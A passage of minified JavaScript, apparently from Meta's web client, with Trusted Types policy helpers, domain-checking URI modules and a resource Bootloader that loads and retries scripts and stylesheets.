      d("TrustedTypesUtils").logWarning("A policy with name " + a + " already exists, returning existing policy.");
      return e;
    }
    try {
      var f = h.createPolicy(a, b);
      e = {
        createHTML: k(a, function (a) {
          for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
          return f.createHTML.apply(f, [a].concat(c));
        }),
        createScriptURL: k(a, function (a) {
          for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
          return f.createScriptURL.apply(f, [a].concat(c));
        }),
        createScript: k(a, function (a) {
          for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
          return f.createScript.apply(f, [a].concat(c));
        })
      };
      i.set(a, e);
      return e;
    } catch (a) {
      d("TrustedTypesUtils").logError("Error creating Trusted Types policy: " + a);
    }
    return j;
  }
  function b() {
    return i.get("default");
  }
  function e(a) {
    return (a = h == null ? void 0 : h.isHTML(a)) != null ? a : !1;
  }
  function f(a) {
    return (a = h == null ? void 0 : h.isScriptURL(a)) != null ? a : !1;
  }
  function m(a) {
    return (a = h == null ? void 0 : h.isScript(a)) != null ? a : !1;
  }
  function n(a) {
    if (h == null || !c("Env").useTrustedTypes) return;
    if (!c("Env").enableDefaultTrustedTypesPolicy) return;
    l("default", a.policy);
  }
  a = {
    isSupportedNatively: a,
    isHTML: e,
    isScript: m,
    isScriptURL: f,
    createPolicy: l,
    getDefaultPolicy: b,
    createDefaultPolicy: n
  };
  g["default"] = a;
}, 98);
__d("TrustedTypesBootloaderDataURIScriptURLPolicy", ["TrustedTypes"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    createScriptURL: function (a) {
      return a;
    }
  };
  b = c("TrustedTypes").createPolicy("bootloader-data-uri", a);
  d = b;
  g["default"] = d;
}, 98);
__d("isExternalFBURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)externalfb\\.com$", "i");
  function a(a) {
    return g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isFacebookDotNetURI", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    if (a.getProtocol() !== "http" && a.getProtocol() !== "https") return !1;
    var b = Number(a.getPort());
    if (!!b && b !== 80 && b !== 443) return !1;
    return a.isSubdomainOfDomain("facebook.net") ? !0 : !1;
  }
  f["default"] = a;
}, 66);
__d("isInstagramCDNURI", [], function (a, b, c, d, e, f) {
  var g = null;
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    if (!a.getDomain() && !a.getProtocol()) return !1;
    if (a.getProtocol() !== "https") return !1;
    g || (g = new RegExp("^static\\.cdninstagram\\.com$", "i"));
    return g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isInstagramURI", [], function (a, b, c, d, e, f) {
  var g = null;
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    if (!a.getDomain() && !a.getProtocol()) return !1;
    if (a.getProtocol() !== "https") return !1;
    g || (g = new RegExp("(^|\\.)instagram\\.com$", "i"));
    return g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isInternURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)intern(mc)?\\.facebook\\.com$", "i");
  function a(a) {
    return g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isInternalFBURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)internalfb\\.com$", "i");
  function a(a) {
    return g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isMetaDotComURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)meta\\.com$", "i"),
    h = ["https"];
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    return !a.getDomain() && !a.getProtocol() ? !0 : h.indexOf(a.getProtocol()) !== -1 && g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("isMetaDotComBlobURI", ["URI", "isMetaDotComURI"], function (a, b, c, d, e, f, g) {
  function a(a) {
    if (!a.includes("blob:")) return !1;
    a = a.replace("blob:", "");
    a = c("URI").tryParseURI(a);
    return a != null && c("isMetaDotComURI")(a);
  }
  g["default"] = a;
}, 98);
__d("isOculusDotComURI", [], function (a, b, c, d, e, f) {
  var g = new RegExp("(^|\\.)oculus\\.com$", "i"),
    h = ["https"];
  function a(a) {
    if (a.isEmpty() && a.toString() !== "#") return !1;
    return !a.getDomain() && !a.getProtocol() ? !1 : h.indexOf(a.getProtocol()) !== -1 && g.test(a.getDomain());
  }
  f["default"] = a;
}, 66);
__d("TrustedTypesMetaURIScriptURLPolicy", ["TrustedTypes", "URI", "err", "isCdnURI", "isExternalFBURI", "isFacebookDotNetURI", "isFacebookURI", "isInstagramCDNURI", "isInstagramURI", "isInternURI", "isInternalFBURI", "isMetaDotComBlobURI", "isOculusDotComURI"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    createScriptURL: function (a) {
      if (c("isMetaDotComBlobURI")(a)) return a;
      var b = c("URI").tryParseURI(a);
      if (b != null && (c("isFacebookURI")(b) || c("isCdnURI")(b) || c("isFacebookDotNetURI")(b) || c("isExternalFBURI")(b) || c("isOculusDotComURI")(b) || c("isInstagramCDNURI")(b) || c("isInstagramURI")(b) || c("isInternURI")(b) || c("isInternalFBURI")(b))) return a;
      throw c("err")("Violated policy TrustedTypesMetaURIScriptURLPolicy: " + a + " is not a Meta URI.");
    }
  };
  b = c("TrustedTypes").createPolicy("meta-uri-script-urls", a);
  d = b;
  g["default"] = d;
}, 98);
__d("__debug", [], function (a, b, c, d, e, f) {
  a = {};
  f["default"] = a;
}, 66);
__d("setTimeoutAcrossTransitions", ["cr:986633"], function (a, b, c, d, e, f, g) {
  g["default"] = b("cr:986633");
}, 98);
__d("Bootloader", ["invariant", "BootloaderConfig", "BootloaderEndpoint", "BootloaderEvents", "BootloaderEventsManager", "BootloaderRetryTracker", "CSRBitMap", "CSRIndexUtil", "CSSLoader", "CSSLoaderConfig", "ClientConsistency", "ErrorPubSub", "ExecutionEnvironment", "FBLogger", "JSResourceReferenceImpl", "MakeHasteTranslations", "NetworkStatus", "RequireDeferredReference", "ResourceHasher", "ResourceTimingsStore", "SiteData", "TimeSlice", "TrustedTypesBootloaderDataURIScriptURLPolicy", "TrustedTypesMetaURIScriptURLPolicy", "__debug", "clearTimeout", "cr:696703", "err", "fb-error", "ifRequireable", "ifRequired", "nullthrows", "performanceAbsoluteNow", "performanceNow", "promiseDone", "setTimeoutAcrossTransitions"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  var i = function () {},
    j = new Set(),
    k = !!c("BootloaderConfig").deferBootloads;
  k && !a.__comet_ssr_is_server_env_DO_NOT_USE && c("setTimeoutAcrossTransitions")(function () {
    $.undeferBootloads(!0);
  }, 15e3);
  var l = [],
    m = new Map(),
    n = new Map(),
    o = new Map(),
    p = new Map(),
    q = new Map(),
    r = null,
    s = new Map(),
    t = new Map(),
    u = new Map(),
    v = new Map(),
    w = new Set(),
    x = !1,
    y = new Set(),
    z = !1,
    A = new (c("BootloaderEventsManager"))(),
    B = new (c("BootloaderRetryTracker"))({
      retries: c("BootloaderConfig").jsRetries,
      abortNum: c("BootloaderConfig").jsRetryAbortNum,
      abortTime: c("BootloaderConfig").jsRetryAbortTime,
      abortCallback: function () {
        c("FBLogger")("bootloader", "js_retry_abort").info("JS retry abort");
      }
    });
  c("ErrorPubSub").unshiftListener(function (a) {
    var b = [];
    for (var c = n, d = Array.isArray(c), e = 0, c = d ? c : c[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
      var f;
      if (d) {
        if (e >= c.length) break;
        f = c[e++];
      } else {
        e = c.next();
        if (e.done) break;
        f = e.value;
      }
      f = f;
      var g = f[0];
      f[1];
      if (o.has(g)) continue;
      f = F(g);
      if (f.type === "csr" || f.type === "async") continue;
      b.push(f.src);
    }
    a.loadingUrls = b;
  });
  function C(a) {
    if (k || !z) return !1;
    for (var b = 0; b < a.length; b++) {
      var c,
        d = a[b];
      d = q.get(d);
      if (!d) return !1;
      d = [d.r, ((c = d.rdfds) == null ? void 0 : c.r) || [], ((c = d.rds) == null ? void 0 : c.r) || []];
      for (c = 0; c < d.length; c++) {
        var e = d[c];
        for (var e = e, f = Array.isArray(e), g = 0, e = f ? e : e[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
          var h;
          if (f) {
            if (g >= e.length) break;
            h = e[g++];
          } else {
            g = e.next();
            if (g.done) break;
            h = g.value;
          }
          h = h;
          if (!s.has(h)) return !1;
        }
      }
    }
    return !0;
  }
  function D(a) {
    var b = q.get(a);
    if (!b) throw c("fb-error").TAAL.blameToPreviousFile(c("err")("Bootloader: %s is not in the component map", a));
    return b;
  }
  function E(a) {
    var b = D(a);
    b.be && (delete b.be, $.done(d("ResourceHasher").getAsyncHash(a)));
  }
  function F(a) {
    var b = s.get(a);
    if (!b) throw c("fb-error").TAAL.blameToPreviousFile(c("err")("No resource entry for hash: %s", a));
    return b;
  }
  function G(a, b) {
    var c = d("ResourceHasher").getAsyncHash(a);
    if (!s.has(c)) s.set(c, {
      type: "async",
      module: a,
      blocking: !!b
    });else {
      a = F(c);
      a.type === "async" || h(0, 21557);
      a.blocking && !b && (a.blocking = !1);
    }
    return c;
  }
  function H(a) {
    return !V(a);
  }
  function I(a) {
    if (!H(a)) return !1;
    a = D(a);
    a = a.be;
    return !!a;
  }
  function J(a) {
    if (!I(a)) return null;
    a = d("ResourceHasher").getAsyncHash(a);
    return A.rsrcDone(a);
  }
  function K() {
    r || (r = document.head || document.getElementsByTagName("head")[0] || document.body);
    return r;
  }
  function L(a) {
    if (c("ExecutionEnvironment").isInWorker) {
      a(null);
      return;
    }
    var b = document.createDocumentFragment();
    a(b);
    K().appendChild(b);
  }
  function M(a, b) {
    if (c("ExecutionEnvironment").isInWorker) return;
    b = c("nullthrows")(b);
    var d = void 0;
    switch (a.type) {
      case "async":
        return;
      case "css":
        d = "style";
        break;
      case "js":
        d = "script";
        break;
      default:
        d = a.type, h(0, 3721);
    }
    if (a.d === 1) return;
    var e = document.createElement("link");
    e.href = a.src;
    e.rel = "preload";
    e.as = d;
    a.nc || (e.crossOrigin = "anonymous");
    b.appendChild(e);
  }
  function N(a, b, d) {
    var e = c("performanceAbsoluteNow")(),
      f = b.src,
      g = c("ResourceTimingsStore").getUID("js", f);
    c("ResourceTimingsStore").annotate("js", g).addStringAnnotation("name", a).addStringAnnotation("source", f);
    c("ResourceTimingsStore").measureRequestSent("js", g);
    c("nullthrows")(self.bl_worker_import_wrapper)(f).then(function () {
      var b = B.getNumRetriesForSource(f);
      b > 0 && c("FBLogger")("bootloader").info("JS retry success [%s] at %s | time: %s | retries: %s", a, f, c("performanceAbsoluteNow")() - e, b);
      c("ResourceTimingsStore").measureResponseReceived("js", g);
      d();
    })["catch"](function (h) {
      c("ResourceTimingsStore").measureResponseReceived("js", g);
      var i = c("performanceAbsoluteNow")();
      B.maybeScheduleRetry(f, function () {
        N(a, b, d);
      }, function () {
        p.set(a, i), c("FBLogger")("bootloader").catching(h).warn("JS loading error [%s] at %s | time: %s | retries: %s | concurrency: %s", a, f, i - e, B.getNumRetriesForSource(f), n.size - o.size), c("NetworkStatus").reportError(), d();
      });
    });
  }
  function O(a, b, d, e) {
    if (c("ExecutionEnvironment").isInWorker) {
      N(a, b, d);
      return;
    }
    e = c("nullthrows")(e);
    var f = document.createElement("script");
    b.d ? f.src = c("TrustedTypesBootloaderDataURIScriptURLPolicy").createScriptURL(b.src) : f.src = c("TrustedTypesMetaURIScriptURLPolicy").createScriptURL(b.src);
    f.async = !0;
    b.nc || (f.crossOrigin = "anonymous");
    b.m != null && (f.dataset.btmanifest = b.m);
    b.tsrc != null && (f.dataset.tsrc = b.tsrc);
    f.dataset.bootloaderHashClient = a;
    P(f, a, b, d);
    e.appendChild(f);
    return;
  }
  function P(a, b, d, e) {
    var f = a.src,
      g = c("performanceAbsoluteNow")(),
      h = c("TimeSlice").getGuardedContinuation("Bootloader script.onresponse"),
      i = c("ResourceTimingsStore").getUID("js", f);
    c("ResourceTimingsStore").annotate("js", i).addStringAnnotation("name", b).addStringAnnotation("source", f);
    c("ifRequireable")("TimeSliceInteraction", function (a) {
      a.informGlobally("bootloader._loadJS").addStringAnnotation("source", f).addStringAnnotation("name", b);
    });
    c("ResourceTimingsStore").measureRequestSent("js", i);
    a.onload = h.bind(void 0, function () {
      var a = B.getNumRetriesForSource(f);
      a > 0 && c("FBLogger")("bootloader").info("JS retry success [%s] at %s | time: %s | retries: %s", b, f, c("performanceAbsoluteNow")() - g, a);
      c("ResourceTimingsStore").measureResponseReceived("js", i);
      e();
    });
    a.onerror = h.bind(void 0, function () {
      c("ResourceTimingsStore").measureResponseReceived("js", i);
      var h = c("performanceAbsoluteNow")();
      B.maybeScheduleRetry(f, function () {
        var c = a.parentNode;
        c && (c.removeChild(a), O(b, d, e, c));
      }, function () {
        p.set(b, h), c("FBLogger")("bootloader").warn("JS loading error [%s] at %s | time: %s | retries: %s | concurrency: %s", b, f, h - g, B.getNumRetriesForSource(f), n.size - o.size), c("NetworkStatus").reportError(), e();
      });
    });
  }
  function Q(a, b, d) {
    return function () {
      c("FBLogger")("bootloader").warn("CSS timeout [%s] at %s | concurrency: %s", a, b.src, n.size - o.size), p.set(a, c("performanceAbsoluteNow")()), c("NetworkStatus").reportError(), d();
    };
  }
  function R(a, b) {
    var c = a.replace(/\/y[a-zA-Z0-9_-]\//, "/");
    if (c.includes("/intern/rsrc.php") || c.includes("/intern/rsrc-translations.php")) return c.replace(/(!)(.+)(\.(?:css|js)(?:$|\?))/, function (a, c, d, e) {
      return c + d.split(",").filter(function (a, c) {
        return !b.has(c);
      }).join(",") + e;
    });else if (c.includes("/rsrc.php") || c.includes("/rsrc-translations.php")) return c.replace(/(.*\/)([^.]+)(\.)/, function (a, c, d, e) {
      return c + d.match(/.{1,11}/g).filter(function (a, c) {
        return !b.has(c);
      }).join("") + e;
    });else return a;
  }
  function S(a, b, e) {
    if (n.has(a)) return;
    n.set(a, c("performanceAbsoluteNow")());
    if ((b.type === "js" || b.type === "css") && b.p != null && b.d !== 1 && c("BootloaderConfig").hypStep4) {
      var f = d("CSRIndexUtil").parseCSRIndexes(b.p),
        g = new Set(),
        i = 0;
      f.forEach(function (b, c) {
        b !== d("CSRIndexUtil").UNKNOWN_RESOURCE_INDEX && t.get(b) !== a && g.add(c), b > i && (i = b);
      });
      i > c("BootloaderConfig").btCutoffIndex && d("BootloaderEvents").notifyResourceInLongTailBTManifest();
      if (g.size === f.length) return;else g.size > 0 && (b.src = R(b.src, g), b.type === "js" && b.tsrc != null && b.tsrc.trim() !== "" && (b.tsrc = R(c("nullthrows")(b.tsrc), g)));
    }
    b.type === "js" && b.tsrc != null && b.tsrc.trim() !== "" && c("promiseDone")(d("MakeHasteTranslations").genFetchAndProcessTranslations(a, c("nullthrows")(b.tsrc)));
    M(b, e);
    switch (b.type) {
      case "js":
        O(a, b, function () {
          return $.done(a);
        }, e);
        break;
      case "css":
        f = function () {
          return $.done(a);
        };
        if (c("ExecutionEnvironment").isInWorker) {
          f();
          break;
        }
        c("CSSLoader").loadStyleSheet(a, b.src, c("nullthrows")(e), !b.nc, f, Q(a, b, f));
        break;
      case "async":
        c("BootloaderEndpoint").load(b.module, b.blocking, a);
        break;
      default:
        b.type, h(0, 3721);
    }
  }
  function T(a, c, e, f) {
    var g = new Map(),
      i = (f = f) != null ? f : d("BootloaderEvents").newResourceMapSet();
    f = [];
    var j = [],
      k = [];
    for (var a = W(a), l = Array.isArray(a), m = 0, a = l ? a : a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
      var o;
      if (l) {
        if (m >= a.length) break;
        o = a[m++];
      } else {
        m = a.next();
        if (m.done) break;
        o = m.value;
      }
      o = o;
      var p = o[0];
      o = o[1];
      var q = void 0;
      switch (o.type) {
        case "css":
          q = o.nonblocking ? "nonblocking" : "blocking";
          break;
        case "js":
          q = "default";
          break;
        case "async":
          q = o.blocking ? "blocking" : "nonblocking";
          break;
        default:
          o.type, h(0, 3721);
      }
      i[q].set(p, o);
      var r = A.rsrcDone(p);
      k.push(r);
      q !== "nonblocking" && (j.push(r), q === "blocking" && f.push(r));
      n.has(p) || g.set(p, o);
    }
    var s, t;
    !b("cr:696703") ? s = t = function (a) {
      return a();
    } : (t = b("cr:696703").scheduleLoggingPriCallback, s = b("cr:696703").getUserBlockingRunAtCurrentPriCallbackScheduler_DO_NOT_USE());
    var u = c.onBlocking,
      v = c.onAll,
      w = c.onLog;
    u && A.registerCallback(function () {
      s(u);
    }, f);
    v && A.registerCallback(function () {
      s(v);
    }, j);
    w && A.registerCallback(function () {
      t(function () {
        return w(i);
      });
    }, k);
    for (q = g, r = Array.isArray(q), p = 0, q = r ? q : q[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
      if (r) {
        if (p >= q.length) break;
        o = q[p++];
      } else {
        p = q.next();
        if (p.done) break;
        o = p.value;
      }
      m = o;
      l = m[0];
      a = m[1];
      S(l, a, e);
    }
  }
  function U(a, b, e) {
    s.set(a, b);
    if (b.type === "async" || b.type === "csr") return;
    var f = b.p;
    if (f) for (var f = d("CSRIndexUtil").parseCSRIndexes(f), g = Array.isArray(f), h = 0, f = g ? f : f[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
      var i;
      if (g) {
        if (h >= f.length) break;
        i = f[h++];
      } else {
        h = f.next();
        if (h.done) break;
        i = h.value;
      }
      i = i;
      if (i === d("CSRIndexUtil").UNKNOWN_RESOURCE_INDEX) continue;
      (!t.has(i) || e) && t.set(i, a);
      (c("BootloaderConfig").phdOn ? b.c == 2 : b.c) && d("CSRBitMap").add(i);
    }
  }
  function aa(a, b) {
    var e = A.bootload(b);
    if (w.has(e)) return [e, null];
    w.add(e);
    var f = c("performanceAbsoluteNow")();
    b = {
      ref: a,
      components: b,
      timesliceContext: c("TimeSlice").getContext(),
      startTime: (a = m.get(e)) != null ? a : f,
      fetchStartTime: f,
      callbackStart: 0,
      callbackEnd: 0,
      tierOne: d("BootloaderEvents").newResourceMapSet(),
      tierTwo: d("BootloaderEvents").newResourceMapSet(),
      tierThree: d("BootloaderEvents").newResourceMapSet(),
      beRequests: new Map()
    };
    d("BootloaderEvents").notifyBootloadStart(b);
    return [e, b];
  }
  function ba(a) {
    return c("ifRequired").call(null, a, function () {
      return !0;
    }, function () {
      return !1;
    });
  }
  function V(a) {
    return c("ifRequireable").call(null, a, function () {
      return !0;
    }, function () {
      return !1;
    });
  }
  function ca(a, b, d, f) {
    v.has(a) || v.set(a, {
      firstBootloadStart: c("performanceAbsoluteNow")(),
      logData: new Set()
    });
    f && c("nullthrows")(v.get(a)).logData.add(f);
    var g = D(a),
      h = g.r,
      i = g.rdfds,
      j = g.rds;
    g = g.be;
    g = H(a) ? G(a, g) : null;
    g == null && A.notify(A.beDone(a));
    T(g != null ? [g].concat(h) : h, {
      onAll: function () {
        return A.notify(A.tierOne(a));
      },
      onLog: function () {
        return A.notify(A.tierOneLog(a));
      }
    }, d, f == null ? void 0 : f.tierOne);
    var k = (i == null ? void 0 : i.m) || [];
    T((i == null ? void 0 : i.r) || [], {
      onBlocking: function () {
        return c("RequireDeferredReference").unblock(k, "css");
      },
      onAll: function () {
        return A.registerCallback(function () {
          A.notify(A.tierTwoStart(a)), e.call(null, k.map(c("RequireDeferredReference").getRDModuleName_DO_NOT_USE), function () {
            return A.notify(A.tierTwo(a));
          });
        }, [A.tierOne(a), b]);
      },
      onLog: function () {
        return A.notify(A.tierTwoLog(a));
      }
    }, d, f == null ? void 0 : f.tierTwo);
    var l = (j == null ? void 0 : j.m) || [];
    T((j == null ? void 0 : j.r) || [], {
      onBlocking: function () {
        return c("RequireDeferredReference").unblock(l, "css");
      },
      onAll: function () {
        return A.registerCallback(function () {
          A.notify(A.tierThreeStart(a)), e.call(null, l.map(c("RequireDeferredReference").getRDModuleName_DO_NOT_USE), function () {
            return A.notify(A.tierThree(a));
          });
        }, [A.tierTwo(a)]);
      },
      onLog: function () {
        return A.notify(A.tierThreeLog(a));
      }
    }, d, f == null ? void 0 : f.tierThree);
  }
  function W(a) {
    var b = new Map();
    for (var e = 0; e < a.length; e++) {
      var f = a[e],
        g = s.get(f);
      if (!g) {
        c("FBLogger")("bootloader").mustfix("Unable to resolve resource %s.", f);
        continue;
      }
      var i = void 0;
      if (g.type === "csr") i = d("CSRIndexUtil").parseCSRIndexes(g.src);else if (g.p) i = d("CSRIndexUtil").parseCSRIndexes(g.p), i.includes(d("CSRIndexUtil").UNKNOWN_RESOURCE_INDEX) && b.set(f, g), i = i.filter(function (a) {
        return a !== d("CSRIndexUtil").UNKNOWN_RESOURCE_INDEX;
      });else {
        b.set(f, g);
        continue;
      }
      for (f = i, g = Array.isArray(f), i = 0, f = g ? f : f[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var j;
        if (g) {
          if (i >= f.length) break;
          j = f[i++];
        } else {
          i = f.next();
          if (i.done) break;
          j = i.value;
        }
        j = j;
        var k = t.get(j);
        if (k == null) {
          var l = JSON.stringify(a.map(function (a) {
            var b = F(a),
              c;
            b.type === "js" || b.type === "css" ? c = b.d ? "" : b.src.split("?")[0] : c = b.src;
            return JSON.stringify(babelHelpers["extends"]({
              hash: a,
              rev: u.get(a)
            }, b, {
              src: c,
              tsrc: null
            }));
          }));
          throw c("FBLogger")("bootloader", "missing-index-map").mustfixThrow("No hash for rsrcIndex " + j + " (rev: " + c("SiteData").client_revision + ", cohort: " + c("SiteData").pkg_cohort + "). " + l);
        }
        j = F(k);
        j.type !== "csr" || h(0, 20056, k);
        b.set(k, j);
      }
    }
    return b.entries();
  }
  function X(a) {
    var b,
      e = a.getAttribute("data-bootloader-hash");
    if (e == null) return;
    var f = d("ResourceHasher").getValidResourceHash(e);
    if (a.id) {
      if (y.has(a.id)) return;
      y.add(a.id);
    }
    e = a.tagName == "SCRIPT" ? {
      src: a.src,
      type: "js"
    } : {
      src: a.href,
      type: "css"
    };
    a.crossOrigin == null && (e.nc = 1);
    e.type === "js" && a.dataset.tsrc != null && a.dataset.tsrc.trim() !== "" && (e.tsrc = a.dataset.tsrc, c("promiseDone")(d("MakeHasteTranslations").genFetchAndProcessTranslations(f, e.tsrc)));
    e.type === "css" && a.getAttribute("data-nonblocking") && (e.nonblocking = 1);
    var g = a.getAttribute("data-c");
    g == "1" ? e.c = 1 : g == "2" && (e.c = 2);
    e.p = a.getAttribute("data-p");
    g = a.getAttribute("data-btmanifest");
    g != null && (e.m = g);
    s.has(f) && !c("BootloaderConfig").silentDups && c("FBLogger")("bootloader").warn("Duplicate resource [%s]: %s", f, e.src);
    U(f, e, !0);
    n.set(f, c("performanceAbsoluteNow")());
    g = function () {
      return $.done(f);
    };
    b = e.type === "js" ? !a.getAttribute("async") : ((b = a.parentNode) == null ? void 0 : b.tagName) === "HEAD";
    b || window._btldr && window._btldr[f] ? g() : e.type === "js" ? P(a, f, e, g) : c("CSSLoader").setupEventListeners(f, e.src, K(), g, Q(f, e, g), c("CSSLoaderConfig").forcePollForBootloader === !0 ? null : a);
  }
  function Y() {
    if (x) return;
    x = !0;
    if (!c("ExecutionEnvironment").canUseDOM || c("ExecutionEnvironment").isInWorker) return;
    Array.from(document.getElementsByTagName("link")).forEach(function (a) {
      return X(a);
    });
    Array.from(document.getElementsByTagName("script")).forEach(function (a) {
      return X(a);
    });
  }
  function Z() {
    z = !0;
    var a = l;
    l = [];
    a.forEach(function (a) {
      var b = a[0],
        c = a[1],
        d = a[2];
      a = a[3];
      a(function () {
        $.loadModules.apply($, [b, c, d]);
      });
    });
  }
  var $ = {
    loadModules: function (a, b, f) {
      b === void 0 && (b = i);
      f === void 0 && (f = "loadModules: unknown caller");
      var g = a,
        h,
        j = !1,
        k = function () {
          c("clearTimeout")(h), j || b.apply(void 0, arguments);
        };
      a = {
        remove: function () {
          j = !0;
        }
      };
      if (c("BootloaderConfig").fastPathForAlreadyRequired && g.every(function (a) {
        return V(a);
      })) {
        e.call(null, g, function () {
          k.apply(void 0, arguments);
        });
        return a;
      }
      if (!C(g)) {
        var n = "Deferred: Bootloader.loadModules";
        n = c("TimeSlice").getGuardedContinuation(n);
        l.push([g, k, f, n]);
        n = A.bootload(g);
        m.set(n, (n = m.get(n)) != null ? n : c("performanceAbsoluteNow")());
        return a;
      }
      n = aa(f, g);
      var o = n[0],
        p = n[1];
      A.registerCallback(e.bind(null, g, function () {
        p && (p.callbackStart = c("performanceAbsoluteNow")()), k.apply(void 0, arguments), p && (p.callbackEnd = c("performanceAbsoluteNow")()), A.notify(o);
      }), g.map(function (a) {
        if (c("BootloaderConfig").earlyRequireLazy) return J(a);else return A.tierOne(a);
      }).filter(Boolean));
      L(function (b) {
        for (var c = 0; c < g.length; c++) {
          var a = g[c];
          ca(a, o, b, p);
        }
      });
      if (p) {
        n = new Set([o]);
        for (var q = 0; q < g.length; q++) {
          var r = g[q];
          n.add(A.beDone(r));
          n.add(A.tierThree(r));
          n.add(A.tierOneLog(r));
          n.add(A.tierTwoLog(r));
          n.add(A.tierThreeLog(r));
        }
        A.registerCallback(function () {
          return d("BootloaderEvents").notifyBootload(p);
        }, Array.from(n));
        c("ifRequireable")("TimeSliceInteraction", function (a) {
          a.informGlobally("Bootloader.loadResources").addSetAnnotation("requested_hashes", Array.from(d("BootloaderEvents").flattenResourceMapSet(p.tierOne).keys())).addSetAnnotation("rdfd_requested_hashes", Array.from(d("BootloaderEvents").flattenResourceMapSet(p.tierTwo).keys())).addSetAnnotation("rd_requested_hashes", Array.from(d("BootloaderEvents").flattenResourceMapSet(p.tierThree).keys())).addStringAnnotation("bootloader_reference", f).addSetAnnotation("requested_components", g);
        });
        h = c("setTimeoutAcrossTransitions")(function () {
          d("BootloaderEvents").notifyBootloaderCallbackTimeout(p);
        }, c("BootloaderConfig").timeout);
      }
      return a;
    },
    loadResources: function (a, b) {
      Y(), L(function (c) {
        var e;
        return T(a.map(function (a) {
          return d("ResourceHasher").getValidResourceHash(a);
        }), (e = b) != null ? e : Object.freeze({}), c);
      });
    },
    requestJSResource_UNSAFE_NEEDS_REVIEW_BY_SECURITY_AND_XFN: function (a) {
      var b = d("ResourceHasher").createExternalJSHash();
      U(b, {
        type: "js",
        src: a,
        nc: 1
      }, !1);
      $.loadResources([b]);
    },
    done: function (a) {
      o.set(a, c("performanceAbsoluteNow")()), A.notify(A.rsrcDone(a));
    },
    beDone: function (a, b, c) {
      for (var d = (d = (d = v.get(a)) == null ? void 0 : d.logData) != null ? d : [], e = Array.isArray(d), f = 0, d = e ? d : d[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var d, g;
        if (e) {
          if (f >= d.length) break;
          g = d[f++];
        } else {
          f = d.next();
          if (f.done) break;
          g = f.value;
        }
        g = g;
        g.beRequests.set(b, c);
      }
      A.notify(A.beDone(a));
    },
    handlePayload: function (a, b) {
      for (var e = (e = a.rsrcTags) != null ? e : [], f = Array.isArray(e), g = 0, e = f ? e : e[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var e, h;
        if (f) {
          if (g >= e.length) break;
          h = e[g++];
        } else {
          g = e.next();
          if (g.done) break;
          h = g.value;
        }
        h = h;
        X(document.getElementById(h));
      }
      f = (g = (h = a.consistency) == null ? void 0 : h.rev) != null ? g : null;
      $.setResourceMap((e = a.rsrcMap) != null ? e : {}, a.sotUpgrades, f, b);
      h = a.csrUpgrade != null ? d("CSRIndexUtil").parseCSRIndexes(a.csrUpgrade) : [];
      g = h.find(function (a) {
        return !t.has(a);
      });
      h.length && f !== null && f !== c("SiteData").client_revision ? c("FBLogger")("bootloader", "csr-mismatch").warn("CSR upgrades included on mismatched rev %s (client rev: %s, cohort: %s).", f, c("SiteData").client_revision, c("SiteData").pkg_cohort) : g != null && x ? c("FBLogger")("bootloader", "missing-csr-upgrade").warn("CSR upgrades included unknown rsrcIndex %d (client rev: %s, cohort: %s).", g, c("SiteData").client_revision, c("SiteData").pkg_cohort) : h.forEach(d("CSRBitMap").add);
      a.compMap && $.enableBootload(a.compMap, b);
    },
    enableBootload: function (a, b) {
      for (var c in a) b && b.comp++, !q.has(c) ? (q.set(c, a[c]), j.has(c) && (j["delete"](c), E(c))) : b && b.dup_comp++;
      Y();
      k || Z();
    },
    undeferBootloads: function (a) {
      a === void 0 && (a = !1);
      if (window.location.search.indexOf("&__deferBootloads=") !== -1) return;
      a && k && d("BootloaderEvents").notifyDeferTimeout({
        componentMapSize: q.size,
        pending: l.map(function (a) {
          var b = a[0];
          a[1];
          var c = a[2];
          a[3];
          return {
            components: b,
            ref: c
          };
        }),
        time: c("performanceNow")()
      });
      k = !1;
      q.size && Z();
    },
    markComponentsAsImmediate: function (a) {
      for (var b = 0; b < a.length; b++) {
        var c = a[b];
        q.has(c) ? E(c) : j.add(c);
      }
    },
    setResourceMap: function (a, b, e, f) {
      var g = !1;
      for (var h in a) {
        f && f.rsrc++;
        h = d("ResourceHasher").getValidResourceHash(h);
        e != null && u.set(h, e);
        var i = a[h],
          j = s.get(h);
        !j ? (i.type === "js" && (g = !0), U(h, i, !1)) : (f && f.dup_rsrc++, (j.type === "js" && i.type === "js" || j.type === "css" && i.type === "css") && i.d && !j.d && (i.type === "js" && (g = !0), j.src = i.src, j.d = 1));
      }
      g && e != null && c("ClientConsistency").addAdditionalRevision(e);
      if (b) for (i = b, j = Array.isArray(i), h = 0, i = j ? i : i[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        if (j) {
          if (h >= i.length) break;
          a = i[h++];
        } else {
